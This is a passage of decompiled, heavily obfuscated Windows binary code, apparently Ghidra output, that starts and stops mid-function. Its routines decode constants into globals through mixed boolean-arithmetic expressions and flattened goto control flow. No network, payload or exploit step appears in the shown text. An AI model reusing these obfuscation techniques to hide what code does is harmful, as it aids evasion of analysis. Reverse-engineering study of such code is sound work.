      cVar9 = '\b';
      goto LAB_1400071d9;
    }
    if (uVar3 != uVar8 + 3) {
      if (uVar3 != uVar8 + 5) {
        if (uVar3 != uVar8 + 4) goto LAB_140006b00;
        bVar4 = bVar5 - 0x38;
        cVar9 = '(';
LAB_14000715a:
        cVar9 = (cVar9 - (bVar4 & bVar2)) * '\x02' + bVar2;
        goto LAB_140007166;
      }
      local_res8 = ('8' - (bVar5 + 0x98 & bVar2)) * '\x02' + bVar2 + bVar5;
      goto LAB_140007247;
    }
    local_res8 = (bVar5 + bVar2 + (bVar5 + 8 & bVar2) * -2) - 0x30;
    goto LAB_140006a32;
  }
  local_res8 = ('\x18' - (bVar5 + 0x78 & bVar2)) * '\x02' + bVar2 + bVar5;
LAB_140006b00:
  while (uVar1 = uVar8, uVar6 < uVar8 + uVar3) {
    while( true ) {
      do {
        uVar8 = uVar1;
        if (uVar3 == uVar8 + 0x5a) {
          bVar4 = bVar5 + 0x50;
          cVar9 = '\x10';
          goto LAB_1400071d9;
        }
        if (uVar3 == uVar8 + 100) {
          uVar8 = uVar8 + 1;
          local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
          goto LAB_140006a32;
        }
        if (uVar3 == uVar8 + 6) {
          local_res8 = (bVar5 + bVar2 + (bVar5 + 0xb0 & bVar2) * -2) - 0x20;
          goto LAB_140006a32;
        }
        if (uVar3 == uVar8 + 0x7a) goto LAB_140006f5a;
        if (uVar3 == uVar8 + 0x40) {
          local_res8 = bVar5 + bVar2 + (bVar5 + 0x40 & bVar2) * -2 + 0x80;
          goto LAB_140007247;
        }
        if (uVar3 == uVar8 + 4) {
          bVar4 = bVar5 + 0x70;
          cVar9 = '0';
          goto LAB_14000715a;
        }
        if (uVar3 == uVar8 + 0x1000) {
          local_res8 = (' ' - (bVar5 + 0xa0 & bVar2)) * '\x02' + bVar2 + bVar5;
          goto LAB_14000727c;
        }
        uVar1 = uVar8;
      } while (uVar3 == uVar8 + 0x20);
      uVar3 = uVar8 + 0x400;
      uVar1 = uVar8 + 0x402;
      if (uVar3 < uVar8 + 0x412) {
        local_res8 = ('(' - (bVar5 - 0x38 & bVar2)) * '\x02' + bVar5 + bVar2;
        goto LAB_140006a20;
      }
      if (uVar3 < uVar8 + 0x403) {
        local_res8 = ('\b' - (bVar5 + 0x28 & bVar2)) * '\x02' + bVar2 + bVar5;
        uVar8 = uVar1;
        goto LAB_140006a44;
      }
      if (uVar3 < uVar8 + 0x602) {
        local_res8 = bVar2 + (bVar5 + 0x58 & bVar2) * -2 + -0x10 + bVar5;
        uVar8 = uVar1;
        goto LAB_140006aa0;
      }
      if (uVar3 < uVar8 + 0x40b) break;
      if (uVar3 < uVar8 + 0x45c) {
        cVar9 = bVar2 + (bVar5 - 0x18 & bVar2) * -2 + -0x70;
        uVar8 = uVar1;
        goto LAB_140006deb;
      }
      if (uVar3 < uVar8 + 0x466) {
        cVar9 = ('8' - (bVar5 + 0x18 & bVar2)) * '\x02' + bVar2;
        uVar8 = uVar1;
        goto LAB_140006db1;
      }
      if (uVar3 < uVar8 + 0x408) {
        local_res8 = ('(' - (bVar5 + 0x48 & bVar2)) * '\x02' + bVar2 + bVar5;
        uVar8 = uVar1;
        goto LAB_140006d91;
      }
      uVar3 = uVar8 + 0x444;
      uVar1 = uVar8 + 0x4be;
      if (uVar8 + 0x4c3 < uVar3) {
        local_res8 = bVar5 + bVar2 + (bVar5 + 0x40 & bVar2) * -2 + 0x80;
        uVar6 = uVar6 + *(byte *)((longlong)&local_38 + uVar6) + uVar1 + 1;
        uVar8 = uVar1;
        goto LAB_140006a32;
      }
      if (uVar8 + 0x51f < uVar3) {
        local_res8 = ('0' - (bVar5 + 0x70 & bVar2)) * '\x02' + bVar2 + bVar5;
        uVar8 = uVar1;
        goto LAB_14000727c;
      }
      if (uVar8 + 0x4e6 < uVar3) {
        local_res8 = ('\x10' - (bVar5 - 0x30 & bVar2)) * '\x02' + bVar2 + bVar5;
        uVar8 = uVar1;
        goto LAB_140007247;
      }
      if (uVar8 + 0x4c1 < uVar3) {
        uVar3 = uVar3 + uVar1;
        local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
        uVar8 = uVar1;
        goto LAB_140007247;
      }
      if (uVar8 + 0x8be < uVar3) {
        cVar9 = bVar2 + (bVar5 + 0x30 & bVar2) * -2 + -0x20;
        uVar8 = uVar1;
        goto LAB_140007116;
      }
      if (uVar8 + 0x4ce < uVar3) {
        local_res8 = bVar5 + bVar2 + (bVar5 + 0x90 & bVar2) * -2 + 0xa0;
        uVar8 = uVar8 + 0x4bf;
        goto LAB_140006a32;
      }
      if (uVar8 + 0x4bf < uVar3) {
        cVar9 = bVar2 + (bVar5 - 0x40 & bVar2) * -2 + -0x80;
        uVar8 = uVar1;
        goto LAB_1400071e5;
      }
      if (uVar3 <= uVar8 + 0x6be) {
        uVar3 = uVar8 + 0x4c8;
        uVar1 = uVar8 + 0x6c8;
      }
    }
    local_res8 = bVar2 + (bVar5 + 0x88 & bVar2) * -2 + -0x30 + bVar5;
    uVar8 = uVar1;
  }
  if (uVar8 + 0x80 <= uVar3) {
    if (uVar3 == uVar8 + 1) {
      local_res8 = ('0' - (bVar5 - 0x10 & bVar2)) * '\x02' + bVar2 + bVar5;
      uVar6 = uVar6 + *(byte *)((longlong)&local_38 + uVar6) + uVar8 + 1;
    }
    else {
      if (uVar3 == uVar8 + 3) {
        local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
        goto LAB_140007247;
      }
      if (uVar3 != uVar8 + 5) {
        if (uVar3 != uVar8 + 2) goto LAB_140006ed3;
        bVar4 = bVar5 + 0x70;
        cVar9 = '0';
LAB_1400071d9:
        cVar9 = (cVar9 - (bVar4 & bVar2)) * '\x02' + bVar2;
        goto LAB_1400071e5;
      }
LAB_140006f5a:
      cVar9 = bVar2 + (bVar5 - 0x20 & bVar2) * -2 + -0x40;
LAB_140007116:
      local_res8 = cVar9 + bVar5;
      *(byte *)((longlong)&local_38 + uVar6) =
           bVar5 + 0x58 + (bVar5 + 0x58 & bVar2) * -2 + -0x68 + bVar2 + local_res8;
      uVar3 = uVar3 + uVar8;
LAB_140007247:
      uVar6 = uVar6 - local_res8;
    }
    goto LAB_140006a32;
  }
  local_res8 = ('8' - (bVar5 + 0x98 & bVar2)) * '\x02' + bVar2 + bVar5;
LAB_140006ed3:
  if (uVar8 + uVar3 == 0x20) {
    cVar9 = ('0' - (bVar5 - 0x10 & bVar2)) * '\x02';
LAB_140007166:
    local_res8 = cVar9 + bVar5;
    uVar8 = uVar8 + 1;
    bVar5 = ('$' - (bVar5 + 0x88 & bVar2)) * '\x02' + bVar5 + 0x88 + bVar2;
    *(byte *)((longlong)&local_38 + uVar6) = bVar5;
    uVar6 = uVar6 - (bVar5 + uVar8);
LAB_14000727c:
    bVar5 = (char)uVar6 + 0x20;
    uVar3 = uVar3 + 1;
    *(byte *)((longlong)&local_38 + uVar6) = ('\x10' - (bVar5 & bVar2)) * '\x02' + bVar5 + bVar2;
    lVar7 = uVar6 + (-1 - uVar3);
    uVar6 = lVar7 + (&bStack_39)[lVar7 + 1] + uVar8 + 1;
    goto LAB_140006a32;
  }
  if (uVar8 + 0x400 < uVar3) {
    cVar9 = bVar2 + (bVar5 + 0x38 & bVar2) * -2 + -0x50;
LAB_140006deb:
    local_res8 = cVar9 + bVar5;
LAB_140006dee:
    if (5 < uVar3) {
      cVar9 = bVar2 * '\x02' + (bVar5 - 0x40 & bVar2) * -2 + -0x80;
      goto LAB_140007116;
    }
    if (uVar8 + 0x42 < uVar3) {
      cVar9 = bVar2 + (bVar5 + 0xb0 & bVar2) * -2 + -0x20;
LAB_140006db1:
      local_res8 = cVar9 + bVar5;
    }
    else {
      if (uVar3 == uVar8 + 1) {
        local_res8 = (bVar5 + bVar2 + (bVar5 - 0x20 & bVar2) * -2) - 0x40;
        uVar6 = uVar6 + *(byte *)((longlong)&local_38 + uVar6) + uVar8 + 1;
        goto LAB_140006a32;
      }
      if (uVar3 == uVar8 + 2) {
        local_res8 = bVar2 + (bVar5 + 0x10 & bVar2) * -2 + -0x60 + bVar5;
        goto LAB_14000727c;
      }
      if (uVar3 == uVar8 + 4) {
        local_res8 = (' ' - (bVar5 + 0xa0 & bVar2)) * '\x02' + bVar2 + bVar5;
        uVar3 = uVar3 + uVar8;
        goto LAB_140007247;
      }
      if (uVar3 == uVar8 + 3) {
        local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
        goto LAB_140006a32;
      }
    }
    if (uVar8 == 0) {
LAB_140006d91:
      *(byte *)((longlong)&local_38 + uVar6) = local_res8;
      uVar6 = uVar6 + 1;
      goto LAB_140006a32;
    }
    local_res8 = (('\x10' - (bVar5 + 0x90 & bVar2)) * '\x02' + bVar2 + bVar5) * '\x02';
  }
  else {
    if (uVar3 != uVar8 + 1) {
      if (uVar3 != uVar8 + 2) {
        if (uVar3 == uVar8 + 3) {
          local_res8 = ('\b' - (bVar5 + 0x28 & bVar2)) * '\x02' + bVar2 + bVar5;
          uVar3 = uVar3 + uVar8;
        }
        else {
          if (uVar3 != uVar8 + 4) {
            if (uVar3 != uVar8 + 7) {
              if (uVar3 != uVar8 + 5) goto LAB_140006dee;
              local_res8 = bVar2 + (bVar5 + 0xb8 & bVar2) * -2 + -0x50 + bVar5;
              goto LAB_14000727c;
            }
            cVar9 = bVar2 + (bVar5 + 0x88 & bVar2) * -2 + -0x30;
            goto LAB_140007166;
          }
          local_res8 = (bVar5 + bVar2 + (bVar5 + 0x58 & bVar2) * -2) - 0x10;
        }
        goto LAB_140007247;
      }
      local_res8 = ('(' - (bVar5 - 0x38 & bVar2)) * '\x02' + bVar2 + bVar5;
      goto LAB_140006a32;
    }
    cVar9 = bVar2 + (bVar5 + 0x68 & bVar2) * -2 + -0x70;
LAB_1400071e5:
    local_res8 = cVar9 + bVar5;
  }
  *(byte *)((longlong)&local_38 + uVar6) =
       bVar5 + 0x28 + (bVar5 + 0x28 & bVar2) * -2 + -0x18 + bVar2;
  uVar8 = uVar8 + 1;
  goto LAB_140006a32;
}



/* ==================================================================== */
/* FUN_140007340 @ 140007340 */

void FUN_140007340(void)

{
  byte bVar1;
  ulonglong uVar2;
  byte bVar3;
  ulonglong uVar4;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  char cVar8;
  byte bVar9;
  byte local_res8;
  int in_stack_0058f34d;
  int in_stack_01528464;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined4 local_14;
  undefined1 local_10;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_10 = 0;
  local_28 = -0x4ca7c82d;
LAB_140007380:
  uVar2 = DAT_140a618c8;
  uVar6 = DAT_140a618d0;
LAB_140007390:
  uVar4 = 0;
  uVar7 = uVar6;
LAB_140007392:
  if (0x18 < uVar4) {
    DAT_140a61928 = (longlong)local_28;
    return;
  }
  bVar1 = *(byte *)((longlong)&local_28 + uVar4);
  bVar9 = (byte)uVar4;
LAB_1400073a5:
  if (uVar4 < uVar2) {
    DAT_140a61928 = (longlong)in_stack_0058f34d;
    return;
  }
  if (uVar7 + 1 <= uVar2) {
    if (uVar2 != uVar7 + 1) {
      if (uVar2 == uVar7 + 2) {
        bVar9 = bVar9 + 0x8d;
        cVar8 = bVar1 + (bVar1 & bVar9) * -2 + '%';
LAB_140007d0b:
        local_res8 = cVar8 + bVar9;
        goto LAB_140007d0e;
      }
      if (uVar2 != uVar7 + 3) {
        if (uVar2 != uVar7 + 8) goto LAB_140007400;
        bVar3 = bVar9 + 0x4b;
        cVar8 = '\x1f';
        goto LAB_140007c6b;
      }
      local_res8 = bVar1 + (bVar9 - 0x2b) + (bVar9 - 0x2b & bVar1) * -2 + 0x2d;
      goto LAB_140007cb9;
    }
    local_res8 = (bVar9 + 0xbb + bVar1 + (bVar1 & bVar9 + 0xbb) * -2) - 0x1d;
    uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
    goto LAB_140007392;
  }
  local_res8 = bVar1 + (bVar9 - 0x17 & bVar1) * -2 + -0x76 + bVar9;
LAB_140007400:
  if (uVar4 < uVar7) {
    DAT_140a61928 = (longlong)in_stack_01528464;
    return;
  }
  if (uVar7 + 0x20 <= uVar2) {
    if (uVar2 != uVar7 + 1) {
      if (uVar2 != uVar7 + 4) {
        if (uVar2 != uVar7 + 3) {
          if (uVar2 == uVar7 + 7) {
            cVar8 = bVar1 + (bVar9 - 0x25 & bVar1) * -2 + -0x22;
            goto LAB_140007bf6;
          }
          if (uVar2 != uVar7 + 2) goto LAB_140007470;
          local_res8 = ('\x03' - (bVar9 + 0x7f & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
          goto LAB_140007392;
        }
        local_res8 = (bVar9 + bVar1 + (bVar9 + 9 & bVar1) * -2) - 0x36;
        goto LAB_140007cda;
      }
      local_res8 = bVar9 + bVar1 + (bVar9 + 0x37 & bVar1) * -2 + 0xb6;
      goto LAB_140007cd7;
    }
    bVar3 = bVar9 - 0x11;
    cVar8 = '3';
    goto LAB_140007c6b;
  }
  local_res8 = (')' - (bVar9 + 0x1d & bVar1)) * '\x02' + bVar1 + bVar9;
LAB_140007470:
  while (uVar6 = uVar7, uVar4 < uVar7 + uVar2) {
    while( true ) {
      do {
        uVar7 = uVar6;
        if (uVar2 == uVar7 + 1000) {
          bVar3 = bVar9 + 0x1e;
          cVar8 = '&';
          goto LAB_140007c6b;
        }
        if (uVar2 == uVar7 + 0x400) {
          uVar7 = uVar7 + 1;
          local_res8 = ('0' - (bVar9 - 0x10 & bVar1)) * '\x02' + bVar1 + bVar9;
          goto LAB_140007392;
        }
        if (uVar2 == uVar7 + 0x1000) {
          local_res8 = (':' - (bVar9 - 0x3e & bVar1)) * '\x02' + bVar1 + bVar9;
          goto LAB_140007392;
        }
        if (uVar2 == uVar7 + 0x61) {
          local_res8 = bVar1 + (bVar9 + 0x94 & bVar1) * -2 + -0x78 + bVar9;
          goto LAB_140007cb9;
        }
        if (uVar2 == uVar7 + 0x7a) {
          local_res8 = bVar9 + bVar1 + (bVar9 + 0x66 & bVar1) * -2 + 0x9c;
          goto LAB_140007cd7;
        }
        if (uVar2 == uVar7 + 0x41) {
          local_res8 = bVar9 + bVar1 + (bVar9 + 0x38 & bVar1) * -2 + 0xb0;
          goto LAB_140007cda;
        }
        if (uVar2 == uVar7 + 0x5a) {
          cVar8 = bVar1 + (bVar9 + 10 & bVar1) * -2 + -0x3c;
          goto LAB_140007bf6;
        }
        if (uVar2 == uVar7 + 0x2a) {
          cVar8 = bVar1 + (bVar9 - 0x24 & bVar1) * -2 + -0x28;
          goto LAB_140007d0b;
        }
        if (uVar2 == uVar7 + 1) {
          local_res8 = (bVar9 + bVar1 + (bVar9 + 0xae & bVar1) * -2) - 0x14;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
          goto LAB_140007392;
        }
        uVar6 = uVar7;
      } while (uVar2 == uVar7 + 2);
      uVar2 = uVar7 + 100;
      uVar6 = uVar7 + 0x67;
      if (uVar2 < uVar7 + 0xe7) {
        local_res8 = bVar1 + bVar9 + (bVar9 + 0x3b & bVar1) * -2 + 0x9e;
        goto LAB_140007380;
      }
      if (uVar2 < uVar7 + 0x267) {
        local_res8 = bVar1 + bVar9 + (bVar9 + 0xd & bVar1) * -2 + 0xb2;
        goto LAB_140007390;
      }
      if (uVar2 < uVar7 + 0x44f) {
        local_res8 = bVar1 + (bVar9 - 0x21 & bVar1) * -2 + -0x3a + bVar9;
        uVar7 = uVar6;
        goto LAB_1400073a5;
      }
      if (uVar2 < uVar7 + 0x467) {
        local_res8 = bVar1 + (bVar9 + 0xb1 & bVar1) * -2 + -0x26 + bVar9;
        uVar7 = uVar6;
        goto LAB_140007400;
      }
      if (uVar2 < uVar7 + 0x1067) break;
      if (uVar2 < uVar7 + 200) {
        cVar8 = ('\x01' - (bVar9 + 0x55 & bVar1)) * '\x02' + bVar1;
        uVar7 = uVar6;
        goto LAB_140007862;
      }
      if (uVar2 < uVar7 + 0xe1) {
        cVar8 = ('\v' - (bVar9 + 0x27 & bVar1)) * '\x02' + bVar1;
        uVar7 = uVar6;
        goto LAB_140007823;
      }
      if (uVar2 < uVar7 + 0xa8) {
        bVar3 = bVar9 - 7;
        cVar8 = '\x15';
        uVar7 = uVar6;
        goto LAB_1400077dd;
      }
      if (uVar2 < uVar7 + 0xc1) {
        local_res8 = ('\x1f' - (bVar9 - 0x35 & bVar1)) * '\x02' + bVar1 + bVar9;
        uVar7 = uVar6;
        goto LAB_1400077c5;
      }
      if (uVar7 + 0x91 <= uVar2) {
        uVar2 = uVar7 + 0xa7;
        uVar6 = uVar7 + 0xa8;
        if (uVar7 + 0xea < uVar2) {
          local_res8 = (bVar9 + bVar1 + (bVar9 + 0x58 & bVar1) * -2) - 0x10;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar6 + 1;
          uVar7 = uVar6;
          goto LAB_140007392;
        }
        if (uVar7 + 0x10c < uVar2) {
          cVar8 = ('\x02' - (bVar9 + 0x2a & bVar1)) * '\x02' + bVar1;
          uVar7 = uVar6;
          goto LAB_140007d0b;
        }
        if (uVar7 + 0x128 < uVar2) {
          cVar8 = ('\f' - (bVar9 - 4 & bVar1)) * '\x02' + bVar1;
          uVar7 = uVar6;
          goto LAB_140007bf6;
        }
        if (uVar7 + 0x2a8 < uVar2) {
          local_res8 = ('\x16' - (bVar9 - 0x32 & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar7 = uVar6;
          goto LAB_140007cda;
        }
        if (uVar7 + 0x490 < uVar2) {
          local_res8 = (' ' - (bVar9 + 0xa0 & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar7 = uVar6;
          goto LAB_140007cd7;
        }
        if (uVar7 + 0x4a8 < uVar2) {
          local_res8 = ('*' - (bVar9 + 0x72 & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar7 = uVar6;
          goto LAB_140007cb9;
        }
        if (uVar7 + 0x10a8 < uVar2) {
          local_res8 = ('4' - (bVar9 + 0x44 & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar7 = uVar6;
          goto LAB_140007392;
        }
        if (uVar7 + 0x109 < uVar2) {
          local_res8 = ('>' - (bVar9 + 0x16 & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar7 = uVar7 + 0xa9;
          goto LAB_140007392;
        }
        if (uVar7 + 0x122 < uVar2) {
          cVar8 = bVar1 + (bVar9 - 0x18 & bVar1) * -2 + -0x70;
          uVar7 = uVar6;
          goto LAB_140007c77;
        }
        if (uVar2 <= uVar7 + 0xe9) {
          uVar2 = uVar7 + 200;
          uVar6 = uVar7 + 0x122;
        }
      }
    }
    local_res8 = bVar1 + (bVar9 + 0x83 & bVar1) * -2 + -0x12 + bVar9;
    uVar7 = uVar6;
  }
  if (uVar7 + 0x61 <= uVar2) {
    if (uVar2 == uVar7 + 1) {
      local_res8 = bVar9 + bVar1 + (bVar9 + 0x3a & bVar1) * -2 + 0xa4;
      uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
    }
    else {
      if (uVar2 == uVar7 + 3) {
        cVar8 = bVar1 + (bVar9 - 0x22 & bVar1) * -2 + -0x34;
        goto LAB_140007bf6;
      }
      if (uVar2 != uVar7 + 5) {
        if (uVar2 != uVar7 + 9) goto LAB_140007865;
        bVar3 = bVar9 - 0x36;
        cVar8 = '\"';
LAB_140007c6b:
        cVar8 = (cVar8 - (bVar3 & bVar1)) * '\x02' + bVar1;
        goto LAB_140007c77;
      }
      local_res8 = (bVar9 + bVar1 + (bVar9 + 0x82 & bVar1) * -2) - 0xc;
LAB_140007cd7:
      uVar2 = uVar2 + uVar7;
LAB_140007cda:
      uVar4 = uVar4 - local_res8;
    }
    goto LAB_140007392;
  }
  cVar8 = bVar1 + (bVar9 - 0x17 & bVar1) * -2 + -0x76;
LAB_140007862:
  local_res8 = cVar8 + bVar9;
LAB_140007865:
  if (uVar7 + uVar2 == 1000) {
    cVar8 = ('\x12' - (bVar9 + 0x7a & bVar1)) * '\x02';
LAB_140007bf6:
    local_res8 = cVar8 + bVar9;
    uVar7 = uVar7 + 1;
    bVar9 = bVar9 + 99 + (bVar9 + 99 & bVar1) * -2 + 'K' + bVar1;
    *(byte *)((longlong)&local_28 + uVar4) = bVar9;
    uVar4 = uVar4 - (bVar9 + uVar7);
LAB_140007d0e:
    bVar9 = (char)uVar4 + 0x4c;
    uVar2 = uVar2 + 1;
    *(byte *)((longlong)&local_28 + uVar4) = bVar1 + (bVar1 & bVar9) * -2 + -0x14 + bVar9;
    lVar5 = uVar4 + (-1 - uVar2);
    uVar4 = lVar5 + (&bStack_29)[lVar5 + 1] + uVar7 + 1;
    goto LAB_140007392;
  }
  if (uVar7 + 6 < uVar2) {
    cVar8 = bVar1 + (bVar9 + 0x85 & bVar1) * -2 + -0x1e;
LAB_140007823:
    local_res8 = cVar8 + bVar9;
LAB_140007826:
    if (0x7f < uVar2) {
      local_res8 = ((bVar1 - (bVar9 + 0xa8 & bVar1)) + '\b') * '\x02' + bVar9;
LAB_140007cb9:
      *(byte *)((longlong)&local_28 + uVar4) =
           bVar9 + 0x91 + (bVar9 + 0x91 & bVar1) * -2 + '\t' + bVar1 + local_res8;
      goto LAB_140007cd7;
    }
    if (uVar7 + 4 < uVar2) {
      bVar3 = bVar9 + 0xa2;
      cVar8 = '\x1a';
LAB_1400077dd:
      local_res8 = (cVar8 - (bVar3 & bVar1)) * '\x02' + bVar1 + bVar9;
    }
    else {
      if (uVar2 == uVar7 + 1) {
        local_res8 = ('$' - (bVar9 + 0x74 & bVar1)) * '\x02' + bVar1 + bVar9;
        uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
        goto LAB_140007392;
      }
      if (uVar2 == uVar7 + 3) {
        cVar8 = ('8' - (bVar9 + 0x18 & bVar1)) * '\x02' + bVar1;
        goto LAB_140007bf6;
      }
      if (uVar2 == uVar7 + 2) {
        local_res8 = bVar9 + bVar1 + (bVar9 - 0x16 & bVar1) * -2 + 0x84;
        goto LAB_140007cda;
      }
      if (uVar2 == uVar7 + 5) {
        local_res8 = bVar1 + (bVar9 + 0x8e & bVar1) * -2 + -0x54 + bVar9;
        goto LAB_140007cb9;
      }
    }
    if (uVar7 < 0x42) {
LAB_1400077c5:
      *(byte *)((longlong)&local_28 + uVar4) = local_res8;
      uVar4 = uVar4 + 1;
      goto LAB_140007392;
    }
    local_res8 = (bVar1 + (bVar9 - 0x2a & bVar1) * -2 + bVar9) * '\x02' - 8;
  }
  else {
    if (uVar2 != uVar7 + 1) {
      if (uVar2 != uVar7 + 2) {
        if (uVar2 == uVar7 + 3) {
          local_res8 = ('#' - (bVar9 + 0x9f & bVar1)) * '\x02' + bVar1 + bVar9;
          goto LAB_140007cd7;
        }
        if (uVar2 != uVar7 + 5) goto LAB_140007826;
        local_res8 = ('-' - (bVar9 + 0x71 & bVar1)) * '\x02' + bVar1 + bVar9;
        goto LAB_140007cda;
      }
      uVar7 = uVar7 + 1;
      local_res8 = ('\x05' - (bVar9 + 0x29 & bVar1)) * '\x02' + bVar1 + bVar9;
      goto LAB_140007392;
    }
    cVar8 = bVar1 + (bVar9 + 0x57 & bVar1) * -2 + -10;
LAB_140007c77:
    local_res8 = cVar8 + bVar9;
  }
  *(byte *)((longlong)&local_28 + uVar4) =
       bVar9 + 0xbf + (bVar9 + 0xbf & bVar1) * -2 + -0x39 + bVar1;
  uVar7 = uVar7 + 1;
  goto LAB_140007392;
}



/* ==================================================================== */
/* FUN_140007de0 @ 140007de0 */

void FUN_140007de0(void)

{
  ulonglong uVar1;
  byte bVar2;
  ulonglong uVar3;
  char cVar4;
  ulonglong uVar5;
  longlong lVar6;
  char cVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  byte bVar10;
  byte local_res8;
  int in_stack_00a343be;
  int in_stack_01428180;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined8 local_14;
  undefined2 local_c;
  undefined1 local_a;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_c = 0;
  local_a = 0;
  local_28 = -0xce9d405;
LAB_140007e22:
  uVar3 = DAT_140a618c8;
  uVar8 = DAT_140a618d0;
LAB_140007e30:
  uVar5 = 0;
  uVar9 = uVar8;
LAB_140007e32:
  do {
    if (0x1e < uVar5) {
      DAT_140a61960 = (longlong)local_28;
      return;
    }
    bVar2 = *(byte *)((longlong)&local_28 + uVar5);
    cVar4 = (char)uVar5;
LAB_140007e45:
    if (uVar5 < uVar3) {
      DAT_140a61960 = (longlong)in_stack_00a343be;
      return;
    }
    if (uVar9 + 1 <= uVar3) {
      if (uVar3 == uVar9 + 1) {
        local_res8 = (cVar4 + 0xbaU + bVar2 + (bVar2 & cVar4 + 0xbaU) * -2) - 0x16;
        uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar9 + 1;
      }
      else {
        if (uVar3 == uVar9 + 2) {
          local_res8 = cVar4 + 0xb2U + ('\x11' - (cVar4 + 0xb2U & bVar2)) * '\x02' + bVar2;
          goto LAB_14000885f;
        }
        if (uVar3 == uVar9 + 3) {
          local_res8 = bVar2 + cVar4 + 0x2eU + (cVar4 + 0x2eU & bVar2) * -2 + 0xbe;
          goto LAB_14000882c;
        }
        if (uVar3 == uVar9 + 5) {
          local_res8 = (bVar2 + cVar4 + 0x26U + (cVar4 + 0x26U & bVar2) * -2) - 10;
          goto LAB_1400087f1;
        }
        if (uVar3 != uVar9 + 7) {
          if (uVar3 != uVar9 + 4) goto LAB_140007eb7;
          bVar10 = cVar4 + 0x9a;
          cVar7 = '2';
          goto LAB_14000877e;
        }
        bVar10 = cVar4 + 0xa2;
        cVar7 = '\x1a';
LAB_1400087c1:
        local_res8 = (cVar7 - (bVar10 & bVar2)) * '\x02' + bVar2 + cVar4;
      }
      goto LAB_140007e32;
    }
    local_res8 = bVar2 + (cVar4 + 0x3eU & bVar2) * -2 + -0x74 + cVar4;
LAB_140007eb7:
    if (uVar5 < uVar9) {
      DAT_140a61960 = (longlong)in_stack_01428180;
      return;
    }
    if (uVar3 < uVar9 + 0x1000) {
      local_res8 = ('>' - (cVar4 + 0x16U & bVar2)) * '\x02' + bVar2 + cVar4;
    }
    else {
      if (uVar3 == uVar9 + 1) {
        cVar7 = bVar2 + (cVar4 + 0x92U & bVar2) * -2 + -0x6c;
        goto LAB_14000878a;
      }
      if (uVar3 == uVar9 + 2) {
        local_res8 = (cVar4 + bVar2 + (cVar4 + 0x8aU & bVar2) * -2) - 0x3c;
        goto LAB_140007e32;
      }
      if (uVar3 == uVar9 + 3) {
        local_res8 = (cVar4 + bVar2 + (cVar4 + 0x82U & bVar2) * -2) - 0xc;
        uVar3 = uVar3 + uVar9;
        goto LAB_14000882c;
      }
      if (uVar3 == uVar9 + 5) {
        local_res8 = ('\x06' - (cVar4 - 2U & bVar2)) * '\x02' + bVar2 + cVar4;
        goto LAB_14000882c;
      }
      if (uVar3 == uVar9 + 7) {
        local_res8 = ('\x12' - (cVar4 + 0x7aU & bVar2)) * '\x02' + bVar2 + cVar4;
        goto LAB_14000885f;
      }
    }
    while (uVar8 = uVar9, uVar5 < uVar9 + uVar3) {
      while( true ) {
        do {
          uVar9 = uVar8;
          if (uVar3 == uVar9 + 0x5a) {
            bVar10 = cVar4 + 0xa4;
            cVar7 = '\x14';
            goto LAB_14000877e;
          }
          if (uVar3 == uVar9 + 5) {
            uVar9 = uVar9 + 1;
            local_res8 = (' ' - (cVar4 + 0x20U & bVar2)) * '\x02' + bVar2 + cVar4;
            goto LAB_140007e32;
          }
          if (uVar3 == uVar9 + 0x20) {
            bVar10 = cVar4 + 0x9c;
            cVar7 = ',';
            goto LAB_1400087c1;
          }
          if (uVar3 == uVar9 + 0x200) {
            local_res8 = ('8' - (cVar4 + 0x18U & bVar2)) * '\x02' + bVar2 + cVar4;
            goto LAB_1400087f1;
          }
          uVar1 = uVar9 + 8;
          if (uVar3 == uVar1) {
            local_res8 = cVar4 + bVar2 + (cVar4 + 0x94U & bVar2) * -2 + 0x88;
            uVar3 = uVar3 + uVar9;
            goto LAB_14000882c;
          }
          if (uVar3 == uVar9 + 0x40) {
            local_res8 = cVar4 + bVar2 + (cVar4 + 0x10U & bVar2) * -2 + 0xa0;
            goto LAB_14000882c;
          }
          if (uVar3 == uVar9 + 0x400) {
            local_res8 = bVar2 + (cVar4 + 0x8cU & bVar2) * -2 + -0x48 + cVar4;
            goto LAB_14000885f;
          }
          if (uVar3 == uVar9 + 0x2a) {
            local_res8 = bVar2 + (cVar4 + 8U & bVar2) * -2 + -0x30 + cVar4;
            goto LAB_140008886;
          }
          if (uVar3 == uVar9 + 6) {
            local_res8 = (cVar4 + bVar2 + (cVar4 + 0x84U & bVar2) * -2) - 0x18;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar9 + 1;
            goto LAB_140007e32;
          }
          uVar8 = uVar9;
        } while (uVar3 == uVar9 + 0x28);
        uVar8 = uVar9 + 0x3f0;
        if (uVar1 < uVar9 + 0x430) {
          local_res8 = bVar2 + cVar4 + (cVar4 + 0xbaU & bVar2) * -2 + 0xa4;
          goto LAB_140007e22;
        }
        uVar3 = uVar1;
        if (uVar1 < uVar9 + 0x7f0) {
          local_res8 = bVar2 + cVar4 + (cVar4 + 0x36U & bVar2) * -2 + 0xbc;
          goto LAB_140007e30;
        }
        if (uVar1 < uVar9 + 0x41a) {
